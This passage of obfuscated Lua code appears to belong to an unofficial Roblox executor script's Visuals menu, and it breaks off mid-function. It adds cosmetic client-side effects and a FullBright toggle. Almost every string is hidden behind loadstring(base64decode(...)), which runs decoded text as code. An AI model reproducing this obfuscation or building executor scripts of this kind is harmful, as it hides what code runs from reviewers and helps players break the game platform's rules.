    function Visuals.updateTrails() for c,tr in pairs(Visuals.TrailParts) do if tr and tr.Parent and c==Player.Character then tr.Lifetime=Visuals.TrailLifetime; tr.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,Visuals.TrailTransparencyStart),NumberSequenceKeypoint.new(1,1)}); local col=Visuals.TrailRainbow and Color3.fromHSV((tick()%5)/5,1,1) or Visuals.TrailColorStatic; tr.Color=Visuals.TrailGradient and ColorSequence.new(Visuals.TrailGradient1,Visuals.TrailGradient2) or ColorSequence.new(col) end end end

    -- Skin Trail
    function Visuals.toggleSkinTrail(en) local c=Player.Character; if not c then return end; local hrp=c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()); if not hrp then return end; for _,p in ipairs(c:GetChildren()) do if p:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and p~=hrp then if en then if not p:FindFirstChild(loadstring(base64decode("U2tpblRyYWls"))()) then local tr=Instance.new(loadstring(base64decode("VHJhaWw="))()); tr.Name=loadstring(base64decode("U2tpblRyYWls"))(); tr.Texture=loadstring(base64decode("cmJ4YXNzZXRpZDovLzEzOTA3ODAxNTc="))(); tr.Color=ColorSequence.new(Visuals.SkinTrailColor); tr.Lifetime=Visuals.SkinTrailLife; tr.Parent=p; local p1=Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))()); p1.Name=loadstring(base64decode("U2tpblBvaW50ZXIx"))(); p1.Parent=p; local p2=Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))()); p2.Name=loadstring(base64decode("U2tpblBvaW50ZXIy"))(); p2.Parent=hrp; tr.Attachment0=p1; tr.Attachment1=p2 end else local tr=p:FindFirstChild(loadstring(base64decode("U2tpblRyYWls"))()); local p1=p:FindFirstChild(loadstring(base64decode("U2tpblBvaW50ZXIx"))()); if tr then tr:Destroy() end; if p1 then p1:Destroy() end end end end; if not en then local p2=hrp:FindFirstChild(loadstring(base64decode("U2tpblBvaW50ZXIy"))()); if p2 then p2:Destroy() end end end
    function Visuals.updateSkinTrail() local c=Player.Character; if not c then return end; for _,d in ipairs(c:GetDescendants()) do if d:IsA(loadstring(base64decode("VHJhaWw="))()) and d.Name==loadstring(base64decode("U2tpblRyYWls"))() then d.Color=ColorSequence.new(Visuals.SkinTrailColor); d.Lifetime=Visuals.SkinTrailLife end end end

    -- ForceField
    function Visuals.saveOriginalColors(c) Visuals.OriginalColors[c]={} for _,p in ipairs(c:GetDescendants()) do if p:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and p.Name~=loadstring(base64decode("SGF0"))() then Visuals.OriginalColors[c][p]={Color=p.Color,Material=p.Material} end end end
    function Visuals.applyForceField(c) Visuals.saveOriginalColors(c); for _,p in ipairs(c:GetDescendants()) do if p:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and p.Name~=loadstring(base64decode("SGF0"))() then p.Color=Visuals.ForceFieldColor; p.Material=Enum.Material.ForceField end end end
    function Visuals.removeForceField(c) local orig=Visuals.OriginalColors[c]; if not orig then return end; for p,d in pairs(orig) do if p and p.Parent and p:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then p.Color=d.Color; p.Material=d.Material end end; Visuals.OriginalColors[c]=nil end
    function Visuals.updateForceField() if not(Player.Character and Visuals.ForceFieldEnabled) then return end; for _,p in ipairs(Player.Character:GetDescendants()) do if p:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and p.Name~=loadstring(base64decode("SGF0"))() and p.Material==Enum.Material.ForceField then p.Color=Visuals.ForceFieldRainbow and Color3.fromHSV((tick()%5)/5,1,1) or Visuals.ForceFieldColor end end end

    -- Aura
    function Visuals.disableAura() for _,o in ipairs(Visuals.AuraEffects) do if o and o.Parent then o:Destroy() end end; table.clear(Visuals.AuraEffects) end
    function Visuals.enableAura(c) Visuals.disableAura(); if not Visuals.CurrentAuraModel then return end; local KnQWQmse=Visuals.CurrentAuraModel:Clone(); for _,o in ipairs(KnQWQmse:GetDescendants()) do if not o:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then local cl=o:Clone(); local pn=o.Parent and o.Parent.Name; local tgt=pn and c:FindFirstChild(pn) or c:FindFirstChildWhichIsA(loadstring(base64decode("QmFzZVBhcnQ="))()); if tgt and not tgt:FindFirstChild(cl.Name) then cl.Parent=tgt; table.insert(Visuals.AuraEffects,cl) end end end; KnQWQmse:Destroy() end
    function Visuals.updateAuraLogic() local id=Visuals.CustomAuraID~=loadstring(base64decode(""))() and(loadstring(base64decode("cmJ4YXNzZXRpZDovLw=="))()..Visuals.CustomAuraID:gsub(loadstring(base64decode("JUQ="))(),loadstring(base64decode(""))())) or Visuals.AuraModels[Visuals.AuraType]; if not id then return end; local ok,m=pcall(function() return game:GetObjects(id)[1] end); if ok and m then Visuals.CurrentAuraModel=m; if Visuals.AuraEnabled and Player.Character then Visuals.enableAura(Player.Character) end end end

    -- Skybox/World
    function Visuals.applySkybox(n) local s=Visuals.SkyboxAssets[n]; if not s then return end; local sky=Lighting:FindFirstChildOfClass(loadstring(base64decode("U2t5"))()) or Instance.new(loadstring(base64decode("U2t5"))(),Lighting); sky.Name=loadstring(base64decode("U2t5"))(); sky.SkyboxBk=s.Bk; sky.SkyboxDn=s.Dn; sky.SkyboxFt=s.Ft; sky.SkyboxLf=s.Lf; sky.SkyboxRt=s.Rt; sky.SkyboxUp=s.Up end
    function Visuals.restoreDefaultSky() local sky=Lighting:FindFirstChildOfClass(loadstring(base64decode("U2t5"))()); if sky and Visuals.DefaultSkySettings.SkyboxBk then sky.SkyboxBk=Visuals.DefaultSkySettings.SkyboxBk; sky.SkyboxDn=Visuals.DefaultSkySettings.SkyboxDn; sky.SkyboxFt=Visuals.DefaultSkySettings.SkyboxFt; sky.SkyboxLf=Visuals.DefaultSkySettings.SkyboxLf; sky.SkyboxRt=Visuals.DefaultSkySettings.SkyboxRt; sky.SkyboxUp=Visuals.DefaultSkySettings.SkyboxUp elseif sky then sky:Destroy() end end
    function Visuals.setNebulaEnabled(en) Visuals.NebulaEnabled=en; if en then local bl=Lighting:FindFirstChild(loadstring(base64decode("TmVidWxhQmxvb20="))()) or Instance.new(loadstring(base64decode("Qmxvb21FZmZlY3Q="))()); bl.Name=loadstring(base64decode("TmVidWxhQmxvb20="))(); bl.Intensity=0.7; bl.Size=24; bl.Threshold=1; bl.Parent=Lighting; local cc=Lighting:FindFirstChild(loadstring(base64decode("TmVidWxhQ29sb3JDb3JyZWN0aW9u"))()) or Instance.new(loadstring(base64decode("Q29sb3JDb3JyZWN0aW9uRWZmZWN0"))()); cc.Name=loadstring(base64decode("TmVidWxhQ29sb3JDb3JyZWN0aW9u"))(); cc.Saturation=0.5; cc.Contrast=0.2; cc.TintColor=Visuals.NebulaThemeColor; cc.Parent=Lighting; local atm=Lighting:FindFirstChild(loadstring(base64decode("TmVidWxhQXRtb3NwaGVyZQ=="))()) or Instance.new(loadstring(base64decode("QXRtb3NwaGVyZQ=="))()); atm.Name=loadstring(base64decode("TmVidWxhQXRtb3NwaGVyZQ=="))(); atm.Density=0.4; atm.Offset=0.25; atm.Glare=1; atm.Haze=2; atm.Color=Visuals.NebulaThemeColor; atm.Decay=Color3.fromRGB(173,216,230); atm.Parent=Lighting; Lighting.Ambient=Visuals.NebulaThemeColor; Lighting.OutdoorAmbient=Visuals.NebulaThemeColor; Lighting.FogStart=100; Lighting.FogEnd=500; Lighting.FogColor=Visuals.NebulaThemeColor else for _,nm in ipairs({loadstring(base64decode("TmVidWxhQmxvb20="))(),loadstring(base64decode("TmVidWxhQ29sb3JDb3JyZWN0aW9u"))(),loadstring(base64decode("TmVidWxhQXRtb3NwaGVyZQ=="))()}) do local o=Lighting:FindFirstChild(nm); if o then o:Destroy() end end; Lighting.Ambient=Visuals.DefaultLighting.Ambient; Lighting.OutdoorAmbient=Visuals.DefaultLighting.OutdoorAmbient; Lighting.FogStart=Visuals.DefaultLighting.FogStart; Lighting.FogEnd=Visuals.DefaultLighting.FogEnd; Lighting.FogColor=Visuals.DefaultLighting.FogColor end end
    function Visuals.setFullBrightEnabled(en) Visuals.FullBrightEnabled=en; if not en then Lighting.Brightness=Visuals.DefaultLighting.Brightness; Lighting.GlobalShadows=Visuals.DefaultLighting.GlobalShadows; Lighting.OutdoorAmbient=Visuals.DefaultLighting.OutdoorAmbient; Lighting.ExposureCompensation=Visuals.DefaultLighting.ExposureCompensation end end
    function Visuals.setScreenEnabled(en) Visuals.ScreenEnabled=en; if en then if Visuals.ScreenConnection then Visuals.ScreenConnection:Disconnect() end; Visuals.ScreenConnection=game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))()).RenderStepped:Connect(function() local cam=workspace.CurrentCamera; if cam then cam.CFrame=cam.CFrame*CFrame.new(0,0,0,1,0,0,0,0.65+Visuals.ScreenIntensity,0,0,0,1) end end) elseif Visuals.ScreenConnection then Visuals.ScreenConnection:Disconnect(); Visuals.ScreenConnection=nil end end
    function Visuals.toggleAnimeImage(en) Visuals.AnimeImageEnabled=en; if en then if Visuals.AnimeImageGui then Visuals.AnimeImageGui:Destroy() end; local g=Instance.new(loadstring(base64decode("U2NyZWVuR3Vp"))()); g.Name=loadstring(base64decode("QW5pbWVJbWFnZUd1aQ=="))(); g.ResetOnSpawn=false; g.Parent=game.Players.LocalPlayer:WaitForChild(loadstring(base64decode("UGxheWVyR3Vp"))()); local img=Instance.new(loadstring(base64decode("SW1hZ2VMYWJlbA=="))()); img.Name=loadstring(base64decode("QW5pbWVJbWFnZQ=="))(); img.Image=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xMTc3ODMwMzU0MjM1NzA="))(); img.Size=UDim2.new(0,350,0,400); img.Position=UDim2.new(1,-25,0,10); img.AnchorPoint=Vector2.new(1,0); img.BackgroundTransparency=1; img.Parent=g; Visuals.AnimeImageGui=g elseif Visuals.AnimeImageGui then Visuals.AnimeImageGui:Destroy(); Visuals.AnimeImageGui=nil end end

    -- Respawn reapply
    function vReapply(c) task.wait(1); if Visuals.HatEnabled then Visuals.addHat(c) end; if Visuals.TrailEnabled then Visuals.addTrail(c) end; if Visuals.ForceFieldEnabled then Visuals.applyForceField(c) end; if Visuals.AuraEnabled then Visuals.enableAura(c) end; if Visuals.SkinTrailEnabled then Visuals.toggleSkinTrail(true) end; if Visuals.AnimeImageEnabled then Visuals.toggleAnimeImage(true) end end
    game.Players.LocalPlayer.CharacterAdded:Connect(vReapply)
    if game.Players.LocalPlayer.Character then task.defer(function() vReapply(game.Players.LocalPlayer.Character) end) end

    -- Heartbeat
    game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))()).Heartbeat:Connect(function()
        if Visuals.HatEnabled then Visuals.updateHats() end
        if Visuals.TrailEnabled then Visuals.updateTrails() end
        if Visuals.ForceFieldEnabled then Visuals.updateForceField() end
        if Visuals.WorldTimeEnabled then Lighting.ClockTime=Visuals.WorldTimeValue end
        if Visuals.FullBrightEnabled then Lighting.Brightness=3; Lighting.GlobalShadows=false; Lighting.OutdoorAmbient=Color3.new(1,1,1); Lighting.ExposureCompensation=0.3 end
    end)

    -- в”Ђв”Ђ UI в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    local VisHatTrail=Tabs.Visuals:CreateBlock({Name=loadstring(base64decode("SGF0ICYgVHJhaWw="))(),Side=loadstring(base64decode("TGVmdA=="))()})
    local VisSkinAura=Tabs.Visuals:CreateBlock({Name=loadstring(base64decode("U2tpbiAmIEF1cmE="))(),Side=loadstring(base64decode("UmlnaHQ="))()})
    local VisWorld=Tabs.Visuals:CreateBlock({Name=loadstring(base64decode("V29ybGQ="))(),Side=loadstring(base64decode("TGVmdA=="))()})
    local VisScreen=Tabs.Visuals:CreateBlock({Name=loadstring(base64decode("U2NyZWVuICYgT3RoZXI="))(),Side=loadstring(base64decode("UmlnaHQ="))()})

    VisHatTrail:CreateToggle({Name=loadstring(base64decode("Q2hpbmVzZSBIYXQ="))(),Flag=loadstring(base64decode("VmlzdWFsSGF0"))(),Default=false,Callback=function(v) Visuals.HatEnabled=v; if v and game.Players.LocalPlayer.Character then Visuals.addHat(game.Players.LocalPlayer.Character) elseif game.Players.LocalPlayer.Character then Visuals.removeHat(game.Players.LocalPlayer.Character) end end})
    VisHatTrail:CreateToggle({Name=loadstring(base64decode("UmFpbmJvdyBIYXQ="))(),Flag=loadstring(base64decode("VmlzdWFsSGF0UmFpbmJvdw=="))(),Default=false,Callback=function(v) Visuals.HatRainbow=v end})
    VisHatTrail:CreateSlider({Name=loadstring(base64decode("SGF0IFRyYW5zcGFyZW5jeQ=="))(),Flag=loadstring(base64decode("VmlzdWFsSGF0VHJhbnM="))(),Min=0,Max=100,Default=30,Callback=function(v) Visuals.HatTransparency=v/100 end})
    VisHatTrail:CreateToggle({Name=loadstring(base64decode("VHJhaWw="))(),Flag=loadstring(base64decode("VmlzdWFsVHJhaWw="))(),Default=false,Callback=function(v) Visuals.TrailEnabled=v; if v and game.Players.LocalPlayer.Character then Visuals.addTrail(game.Players.LocalPlayer.Character) elseif game.Players.LocalPlayer.Character then Visuals.removeTrail(game.Players.LocalPlayer.Character) end end})
    VisHatTrail:CreateToggle({Name=loadstring(base64decode("VHJhaWwgR3JhZGllbnQgTW9kZQ=="))(),Flag=loadstring(base64decode("VmlzdWFsVHJhaWxHcmFk"))(),Default=false,Callback=function(v) Visuals.TrailGradient=v; if Visuals.TrailEnabled and game.Players.LocalPlayer.Character then Visuals.addTrail(game.Players.LocalPlayer.Character) end end})
    VisHatTrail:CreateToggle({Name=loadstring(base64decode("VHJhaWwgUmFpbmJvdw=="))(),Flag=loadstring(base64decode("VmlzdWFsVHJhaWxSYWluYm93"))(),Default=false,Callback=function(v) Visuals.TrailRainbow=v end})
    VisHatTrail:CreateSlider({Name=loadstring(base64decode("VHJhaWwgTGlmZXRpbWU="))(),Flag=loadstring(base64decode("VmlzdWFsVHJhaWxMaWZl"))(),Min=1,Max=30,Default=5,Callback=function(v) Visuals.TrailLifetime=v/10 end})
    VisHatTrail:CreateSlider({Name=loadstring(base64decode("VHJhaWwgVHJhbnNwYXJlbmN5"))(),Flag=loadstring(base64decode("VmlzdWFsVHJhaWxUcmFucw=="))(),Min=0,Max=100,Default=0,Callback=function(v) Visuals.TrailTransparencyStart=v/100 end})

    VisSkinAura:CreateToggle({Name=loadstring(base64decode("Rm9yY2VGaWVsZCBTa2lu"))(),Flag=loadstring(base64decode("VmlzdWFsRkY="))(),Default=false,Callback=function(v) Visuals.ForceFieldEnabled=v; local c=game.Players.LocalPlayer.Character; if c then if v then Visuals.applyForceField(c) else Visuals.removeForceField(c) end end end})
    VisSkinAura:CreateToggle({Name=loadstring(base64decode("UmFpbmJvdyBGb3JjZUZpZWxk"))(),Flag=loadstring(base64decode("VmlzdWFsRkZSYWluYm93"))(),Default=false,Callback=function(v) Visuals.ForceFieldRainbow=v end})
    VisSkinAura:CreateToggle({Name=loadstring(base64decode("U2tpbiBUcmFpbA=="))(),Flag=loadstring(base64decode("VmlzdWFsU2tpblRyYWls"))(),Default=false,Callback=function(v) Visuals.SkinTrailEnabled=v; Visuals.toggleSkinTrail(v) end})
    VisSkinAura:CreateSlider({Name=loadstring(base64decode("U2tpbiBUcmFpbCBMaWZl"))(),Flag=loadstring(base64decode("VmlzdWFsU2tpblRyYWlsTGlmZQ=="))(),Min=1,Max=30,Default=5,Callback=function(v) Visuals.SkinTrailLife=v/10; if Visuals.SkinTrailEnabled then Visuals.updateSkinTrail() end end})
    VisSkinAura:CreateToggle({Name=loadstring(base64decode("TG9jYWwgQXVyYQ=="))(),Flag=loadstring(base64decode("VmlzdWFsQXVyYQ=="))(),Default=false,Callback=function(v) Visuals.AuraEnabled=v; if v then if not Visuals.CurrentAuraModel then Visuals.updateAuraLogic() end; local c=game.Players.LocalPlayer.Character; if c then Visuals.enableAura(c) end else Visuals.disableAura() end end})
    do
        local ai={} for sckTj49T in pairs(Visuals.AuraModels) do table.insert(ai,sckTj49T) end; table.sort(ai)
        VisSkinAura:CreateDropdown({Name=loadstring(base64decode("QXVyYSBUeXBl"))(),Flag=loadstring(base64decode("VmlzdWFsQXVyYVR5cGU="))(),Items=ai,Default=loadstring(base64decode("R29kbHk="))(),Callback=function(v) Visuals.AuraType=v; Visuals.CustomAuraID=loadstring(base64decode(""))(); if Visuals.AuraEnabled then Visuals.updateAuraLogic() end end})
    end
    VisSkinAura:CreateInput({Name=loadstring(base64decode("Q3VzdG9tIEF1cmEgSUQ="))(),Flag=loadstring(base64decode("VmlzdWFsQ3VzdG9tQXVyYQ=="))(),Default=loadstring(base64decode(""))(),Placeholder=loadstring(base64decode("QXNzZXQgSUQuLi4="))(),Finished=true,Callback=function(v) Visuals.CustomAuraID=v:match(loadstring(base64decode("XiVzKiguLSklcyok"))()) or loadstring(base64decode(""))(); if Visuals.AuraEnabled and Visuals.CustomAuraID~=loadstring(base64decode(""))() then Visuals.updateAuraLogic() end end})

    do
        local si={} for sckTj49T in pairs(Visuals.SkyboxAssets) do table.insert(si,sckTj49T) end; table.sort(si)
        VisWorld:CreateDropdown({Name=loadstring(base64decode("U2t5Ym94"))(),Flag=loadstring(base64decode("VmlzdWFsU2t5Ym94"))(),Items=si,Default=loadstring(base64decode("SEQ="))(),Callback=function(v) Visuals.CurrentSkybox=v; Visuals.CustomSkyEnabled=true; Visuals.applySkybox(v) end})
    end
    VisWorld:CreateToggle({Name=loadstring(base64decode("RW5hYmxlIEN1c3RvbSBTa3lib3g="))(),Flag=loadstring(base64decode("VmlzdWFsU2t5Ym94VG9nZ2xl"))(),Default=false,Callback=function(v) Visuals.CustomSkyEnabled=v; if v then Visuals.applySkybox(Visuals.CurrentSkybox) else Visuals.restoreDefaultSky() end end})
    VisWorld:CreateToggle({Name=loadstring(base64decode("TmVidWxhIFRoZW1l"))(),Flag=loadstring(base64decode("VmlzdWFsTmVidWxh"))(),Default=false,Callback=function(v) Visuals.setNebulaEnabled(v) end})
    VisWorld:CreateToggle({Name=loadstring(base64decode("RnVsbCBCcmlnaHQ="))(),Flag=loadstring(base64decode("VmlzdWFsRnVsbEJyaWdodA=="))(),Default=false,Callback=function(v) Visuals.setFullBrightEnabled(v) end})
    VisWorld:CreateToggle({Name=loadstring(base64decode("VGltZSBDaGFuZ2Vy"))(),Flag=loadstring(base64decode("VmlzdWFsVGltZVRvZ2dsZQ=="))(),Default=false,Callback=function(v) Visuals.WorldTimeEnabled=v end})
    VisWorld:CreateSlider({Name=loadstring(base64decode("V29ybGQgVGltZSAoMC0yNCk="))(),Flag=loadstring(base64decode("VmlzdWFsVGltZVZhbA=="))(),Min=0,Max=24,Default=12,Callback=function(v) Visuals.WorldTimeValue=v end})
    VisWorld:CreateSlider({Name=loadstring(base64decode("Rk9W"))(),Flag=loadstring(base64decode("VmlzdWFsRk9W"))(),Min=40,Max=120,Default=70,Callback=function(v) local cam=workspace.CurrentCamera; if cam then cam.FieldOfView=v end end})

    VisScreen:CreateToggle({Name=loadstring(base64decode("U2NyZWVuIFN0cmV0Y2ggRWZmZWN0"))(),Flag=loadstring(base64decode("VmlzdWFsU2NyZWVuRlg="))(),Default=false,Callback=function(v) Visuals.setScreenEnabled(v) end})
    VisScreen:CreateSlider({Name=loadstring(base64decode("U2NyZWVuIEludGVuc2l0eQ=="))(),Flag=loadstring(base64decode("VmlzdWFsU2NyZWVuSW50"))(),Min=0,Max=20,Default=0,Callback=function(v) Visuals.ScreenIntensity=v/100 end})
    VisScreen:CreateToggle({Name=loadstring(base64decode("QW5pbWUgSW1hZ2U="))(),Flag=loadstring(base64decode("VmlzdWFsQW5pbWVJbWc="))(),Default=false,Callback=function(v) Visuals.toggleAnimeImage(v) end})

    -- =====================================================================
    -- CUSTOM EFFECTS BLOCK  (dropdown selector)
    -- =====================================================================
    local VisEffects = Tabs.Visuals:CreateBlock({Name=loadstring(base64decode("Q3VzdG9tIEVmZmVjdHM="))(), Side=loadstring(base64decode("TGVmdA=="))()})

    -- =====================================================================
    -- All effect start/stop functions
    -- =====================================================================
    Visuals.FX = {}
    Visuals.FX.ActiveEffect  = loadstring(base64decode("Tm9uZQ=="))()
    Visuals.FX.ActiveEnabled = false
    Visuals.FX.Connections   = {}
    Visuals.FX.Parts         = {}

    function FX_cleanup()
        for _, c in ipairs(Visuals.FX.Connections) do pcall(function() c:Disconnect() end) end
        Visuals.FX.Connections = {}
        for _, p in ipairs(Visuals.FX.Parts) do pcall(function() p:Destroy() end) end
        Visuals.FX.Parts = {}
    end

    local FX_defs = {}

    -- в”Ђв”Ђ 1. Orbit Rings в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs[loadstring(base64decode("T3JiaXQgUmluZ3M="))()] = function()
        local char = Player.Character
        local hrp  = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not hrp then return end
        local ringData, count = {}, 3
        for xVec0uwV = 1, count do
            local ring = Instance.new(loadstring(base64decode("UGFydA=="))())
            ring.Name=loadstring(base64decode("WE9DVUZYUGFydA=="))(); ring.Size=Vector3.new(7,.18,.18)
            ring.Material=Enum.Material.Neon; ring.CanCollide=false
            ring.CanTouch=false; ring.CanQuery=false; ring.Massless=true
            ring.Anchored=true; ring.Parent=char
            table.insert(Visuals.FX.Parts, ring)
            table.insert(ringData,{
                part=(ring),
                offset=(xVec0uwV-1)*(math.pi*2/count),
                tilt=(xVec0uwV-1)*(math.pi/count),
            })
        end
        local t=0
        local conn = R.Heartbeat:Connect(function(dt)
            t=t+dt*2.2
            local h2 = Player.Character and Player.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
            if not h2 then return end
            for _,d in ipairs(ringData) do
                local ang=t+d.offset
                d.part.Color=Color3.fromHSV(((t*.08+d.offset)%(math.pi*2))/(math.pi*2),1,1)
                d.part.CFrame=h2.CFrame*CFrame.Angles(d.tilt,0,0)*CFrame.Angles(0,ang,0)*CFrame.new(3.6,0,0)*CFrame.Angles(0,math.pi/2,0)
            end
        end)
        table.insert(Visuals.FX.Connections, conn)
    end

    -- в”Ђв”Ђ 2. Lightning Body в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs[loadstring(base64decode("TGlnaHRuaW5nIEJvZHk="))()] = function()
        local char = Player.Character
        if not char then return end
        local limbs={loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))(),loadstring(base64decode("SGVhZA=="))(),loadstring(base64decode("TGVmdCBBcm0="))(),loadstring(base64decode("UmlnaHQgQXJt"))(),loadstring(base64decode("TGVmdCBMZWc="))(),loadstring(base64decode("UmlnaHQgTGVn"))()}
        for _,name in ipairs(limbs) do
            local part=char:FindFirstChild(name)
            if part and part:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                local a0=Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))()); a0.Position=Vector3.new(0,part.Size.Y/2,0); a0.Parent=part
                local a1=Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))()); a1.Position=Vector3.new(0,-part.Size.Y/2,0); a1.Parent=part
                local bolt=Instance.new(loadstring(base64decode("QmVhbQ=="))())
                bolt.Attachment0=a0; bolt.Attachment1=a1; bolt.FaceCamera=true
                bolt.Width0=.06; bolt.Width1=.06; bolt.Segments=12
                bolt.LightEmission=1; bolt.LightInfluence=0
                bolt.TextureLength=1; bolt.TextureSpeed=4
                bolt.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(120,60,255)),ColorSequenceKeypoint.new(.5,Color3.fromRGB(200,160,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(120,60,255))})
                bolt.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,.2),NumberSequenceKeypoint.new(.5,0),NumberSequenceKeypoint.new(1,.2)})
                bolt.Parent=part
                table.insert(Visuals.FX.Parts,a0); table.insert(Visuals.FX.Parts,a1); table.insert(Visuals.FX.Parts,bolt)
                local alive=true
                table.insert(Visuals.FX.Connections,{Disconnect=function() alive=false end})
                task.spawn(function()
                    while alive and bolt and bolt.Parent do
                        bolt.Segments=math.random(6,18); bolt.Width0=math.random(3,9)/100; bolt.Width1=bolt.Width0
                        task.wait(math.random(2,8)/100)
                    end
                end)
            end
        end
    end

    -- в”Ђв”Ђ 3. Glitch Effect в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs[loadstring(base64decode("R2xpdGNoIEVmZmVjdA=="))()] = function()
        local conn = R.Heartbeat:Connect(function()
            local char=Player.Character
            local hrp=char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
            if not hrp or hrp.Anchored then return end
            if math.random(1,8)==1 then
                local orig=hrp.CFrame
                hrp.CFrame=orig+Vector3.new((math.random()-.5)*.55,(math.random()-.5)*.3,(math.random()-.5)*.55)
                task.defer(function() if hrp and hrp.Parent then hrp.CFrame=orig end end)
            end
        end)
        table.insert(Visuals.FX.Connections, conn)
    end

    -- в”Ђв”Ђ 4. Fire Aura в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs[loadstring(base64decode("RmlyZSBBdXJh"))()] = function()
        local char=Player.Character
        if not char then return end
        local targets={loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))(),loadstring(base64decode("SGVhZA=="))(),loadstring(base64decode("TGVmdCBBcm0="))(),loadstring(base64decode("UmlnaHQgQXJt"))(),loadstring(base64decode("TGVmdCBMZWc="))(),loadstring(base64decode("UmlnaHQgTGVn"))()}
        for _,name in ipairs(targets) do
            local p=char:FindFirstChild(name)
            if p then
                local fire=Instance.new(loadstring(base64decode("RmlyZQ=="))())
                fire.Size=4; fire.Heat=6
                fire.Color=Color3.fromRGB(255,80,0)
                fire.SecondaryColor=Color3.fromRGB(255,200,0)
                fire.Parent=p
                table.insert(Visuals.FX.Parts,fire)
            end
        end
    end

    -- в”Ђв”Ђ 5. Rainbow Body в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs[loadstring(base64decode("UmFpbmJvdyBCb2R5"))()] = function()
        local char=Player.Character
        if not char then return end
        local origColors={}
        for _,p in ipairs(char:GetChildren()) do
            if p:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then origColors[p]=p.Color end
        end
        local t=0
        local conn=R.Heartbeat:Connect(function(dt)
            t=t+dt*.5
            local c2=Player.Character
            if not c2 then return end
            for xVec0uwV,p in ipairs(c2:GetChildren()) do
                if p:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                    p.Color=Color3.fromHSV((t+xVec0uwV*.1)%1,1,1)
                    p.Material=Enum.Material.Neon
                end
            end
        end)
        table.insert(Visuals.FX.Connections,conn)
        -- restore on cleanup via parts table (store sentinel)
        local sentinel={_restore=origColors, Destroy=function(self)
            local c=Player.Character
            if not c then return end
            for _,p in ipairs(c:GetChildren()) do
                if p:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
